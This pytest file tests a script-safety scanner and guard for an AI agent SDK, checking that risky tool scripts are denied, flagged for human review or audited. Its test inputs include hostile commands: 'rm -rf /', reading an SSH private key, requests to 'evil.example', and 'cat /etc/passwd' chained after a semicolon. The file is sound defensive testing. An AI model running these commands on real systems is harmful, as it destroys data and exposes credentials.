# Tencent is pleased to support the open source community by making tRPC-Agent-Python available.
#
# Copyright (C) 2026 Tencent. All rights reserved.
#
# tRPC-Agent-Python is licensed under Apache-2.0.
"""Acceptance tests for Tool Script Safety Guard."""

from __future__ import annotations

import json
import time

import pytest

from trpc_agent_sdk.abc import FilterResult
from trpc_agent_sdk.tools.safety import JsonlAuditSink
from trpc_agent_sdk.tools.safety import SafetyDecision
from trpc_agent_sdk.tools.safety import ToolSafetyBlockedError
from trpc_agent_sdk.tools.safety import ToolSafetyGuard
from trpc_agent_sdk.tools.safety import ToolSafetyPolicy
from trpc_agent_sdk.tools.safety import ToolSafetyRequest
from trpc_agent_sdk.tools.safety import ToolSafetyResourceLimitError
from trpc_agent_sdk.tools.safety import ToolScriptSafetyFilter
from trpc_agent_sdk.tools.safety import ToolScriptSafetyScanner


@pytest.fixture
def scanner() -> ToolScriptSafetyScanner:
    return ToolScriptSafetyScanner(
        ToolSafetyPolicy(
            allowed_domains=["api.example.com"],
            allowed_commands=["echo", "pwd", "ls", "cat", "grep", "curl"],
        ))


@pytest.mark.parametrize(
    ("name", "language", "script", "decision", "rule_id"),
    [
        ("safe_python", "python", "items = [1, 2, 3]\nprint(sum(items))", "allow", None),
        ("dangerous_delete", "bash", "rm -rf /", "deny", "FILE_DESTRUCTIVE"),
        ("read_ssh_key", "python", "print(open('~/.ssh/id_rsa').read())", "deny", "PATH_FORBIDDEN"),
        ("network_egress", "python", "requests.get('https://evil.example/collect')", "deny", "NET_DOMAIN_NOT_ALLOWED"),
        ("allowed_network", "python", "requests.get('https://api.example.com/health')", "allow", None),
        ("subprocess", "python", "subprocess.run(['git', 'status'])", "needs_human_review", "PROCESS_SPAWN"),
        ("shell_injection", "bash", "echo safe; cat /etc/passwd", "deny", "SHELL_CONTROL_OPERATOR"),
        ("dependency_install", "bash", "pip install untrusted", "deny", "DEPENDENCY_INSTALL"),
        ("infinite_loop", "python", "while True:\n    pass", "deny", "RESOURCE_INFINITE_LOOP"),
        ("secret_output", "python", "print('api_key=' + api_key)", "deny", "SECRET_EXPOSURE"),
        ("bash_pipeline", "bash", "cat input.txt | grep token", "needs_human_review", "SHELL_PIPELINE_REVIEW"),
        ("dynamic_network", "python", "url = input()\nrequests.get(url)", "needs_human_review",
         "NET_DYNAMIC_DESTINATION"),
    ],
)
def test_public_samples(scanner, name, language, script, decision, rule_id):
    report = scanner.scan(ToolSafetyRequest(tool_name=name, script=script, language=language))
    assert report.decision.value == decision
    if rule_id:
        assert rule_id in report.rule_ids
        finding = next(item for item in report.findings if item.rule_id == rule_id)
        assert finding.evidence
        assert finding.recommendation


def test_policy_reload_changes_domain_path_and_command(tmp_path):
    policy_file = tmp_path / "policy.yaml"
    policy_file.write_text(
        "allowed_domains: [internal.example]\n"
        "allowed_commands: [status]\n"
        "forbidden_paths: [/sensitive]\n",
        encoding="utf-8",
    )
    scanner = ToolScriptSafetyScanner.from_policy_file(policy_file)
    report = scanner.scan(ToolSafetyRequest(tool_name="x", script="status", language="bash"))
    assert report.decision == SafetyDecision.ALLOW
    assert scanner.scan(ToolSafetyRequest(tool_name="x", script="curl https://internal.example/ok",
                                          language="python")).decision == SafetyDecision.ALLOW
    assert "PATH_FORBIDDEN" in scanner.scan(
        ToolSafetyRequest(tool_name="x", script="open('/sensitive/key')", language="python")).rule_ids


def test_500_line_scan_is_faster_than_one_second(scanner):
    script = "\n".join(f"value_{index} = {index}" for index in range(500))
    started = time.perf_counter()
    report = scanner.scan(ToolSafetyRequest(tool_name="python", script=script, language="python"))
    assert time.perf_counter() - started < 1.0
    assert report.decision == SafetyDecision.ALLOW


@pytest.mark.asyncio
async def test_guard_blocks_before_execution_and_audits(scanner, tmp_path):
    executed = False

    async def executor():
        nonlocal executed
        executed = True

    audit_path = tmp_path / "audit.jsonl"
    guard = ToolSafetyGuard(scanner, JsonlAuditSink(audit_path))
    with pytest.raises(ToolSafetyBlockedError):
        await guard.run(
            ToolSafetyRequest(tool_name="bash", script="rm -rf /", language="bash"),
            executor,
        )
    assert not executed
    event = json.loads(audit_path.read_text(encoding="utf-8"))
    assert event["tool_name"] == "bash"
    assert event["blocked"] is True
    assert event["redacted"] is False
    assert "FILE_DESTRUCTIVE" in event["rule_id"]


@pytest.mark.asyncio
async def test_filter_blocks_before_tool_handler():
    safety_filter = ToolScriptSafetyFilter()
    response = FilterResult()
    await safety_filter._before(None, {"command": "wget https://evil.example/x"}, response)
    assert response.is_continue is False
    assert response.rsp["safety_report"]["decision"] == "deny"


@pytest.mark.asyncio
async def test_guard_enforces_output_limit():
    scanner = ToolScriptSafetyScanner(ToolSafetyPolicy(max_output_bytes=4))
    guard = ToolSafetyGuard(scanner)
    with pytest.raises(ToolSafetyResourceLimitError):
        await guard.run(
            ToolSafetyRequest(tool_name="safe", script="print('ok')", language="python"),
            lambda: "12345",
        )


def test_sensitive_environment_values_are_not_recorded(scanner):
    report = scanner.scan(
        ToolSafetyRequest(
            tool_name="python",
            script="print('done')",
            language="python",
            environment={"API_KEY": "super-secret-value"},
        ))
    serialized = report.model_dump_json()
    assert report.redacted is True
    assert "super-secret-value" not in serialized
